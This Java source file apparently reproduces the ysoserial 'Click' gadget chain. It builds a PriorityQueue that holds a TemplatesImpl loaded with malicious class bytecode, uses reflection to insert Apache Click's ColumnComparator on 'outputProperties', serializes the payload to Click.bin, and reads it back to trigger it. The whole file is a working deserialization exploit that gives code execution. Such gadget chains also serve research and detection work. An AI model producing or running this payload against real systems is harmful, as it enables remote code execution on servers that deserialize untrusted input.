package org.su18.serialize.ysoserial.Click;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author su18
 */
public class Click {

	public static String fileName = "Click.bin";

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 初始化 PriorityQueue
		PriorityQueue<Object> queue = new PriorityQueue<>(2);
		queue.add("su18");
		queue.add("su19");

		// 反射将 TemplatesImpl 放在 PriorityQueue 里
		Field field = PriorityQueue.class.getDeclaredField("queue");
		field.setAccessible(true);
		Object[] objects = (Object[]) field.get(queue);
		objects[0] = tmpl;

		Class<?>       c           = Class.forName("org.apache.click.control.Column$ColumnComparator");
		Constructor<?> constructor = c.getDeclaredConstructor(Column.class);
		constructor.setAccessible(true);

		Column column = new Column("outputProperties");
		// 为了避免反序列化比较时的空指针，为 column 设置一个 Table 属性
		column.setTable(new Table());
		Comparator<?> comparator = (Comparator<?>) constructor.newInstance(column);

		// 反射将 BeanComparator 写入 PriorityQueue 中
		Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field2.setAccessible(true);
		field2.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue, fileName);
		SerializeUtil.readFileObject(fileName);
	}

}
